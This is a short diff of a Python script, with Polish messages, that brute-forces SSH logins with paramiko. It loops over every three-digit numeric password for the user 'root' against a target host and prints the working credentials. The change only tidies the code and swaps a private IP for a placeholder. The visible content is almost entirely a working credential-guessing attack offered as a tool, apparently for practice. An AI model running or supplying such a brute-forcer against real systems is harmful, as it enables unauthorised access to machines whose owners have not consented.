@@ -11,15 +11,14 @@ def logging_ssh(hostname, username, password):
         ssh_session.connect(hostname=hostname, username=username, password=password, timeout=3)
         print(username, password)
         return True
-    except paramiko.ssh_exception.AuthenticationException as error:
+    except paramiko.ssh_exception.AuthenticationException:
         print("Nie poprawne haslo lub login")
         ssh_session.close()
         return False
 
 
-hostname = "192.168.55.8"
+hostname = "wprowadz_ip"
 username = "root"
-passwords = []
 
 for guess_password in itertools.product(string.digits, repeat=3):
     password = "".join(guess_password)
